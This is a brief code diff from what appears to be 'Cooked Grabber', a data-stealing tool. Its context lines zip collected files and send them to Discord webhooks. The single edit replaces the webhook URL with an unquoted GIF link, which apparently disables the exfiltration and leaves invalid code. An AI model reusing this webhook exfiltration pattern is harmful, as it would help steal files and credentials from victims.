@@ -470,7 +470,7 @@ def send_webhook(DISCORD_WEBHOOK_URLs):
                     zip.write(name_f)
         for URL in DISCORD_WEBHOOK_URLs:
             webhook = DiscordWebhook(
-                url=URL,
+                url=https://tenor.com/view/triste-gif-27628801,
                 username="Cooked Grabber",
                 avatar_url="https://i.postimg.cc/FRdZ5DJV/discord-avatar-128-ABF2-E.png",
             )
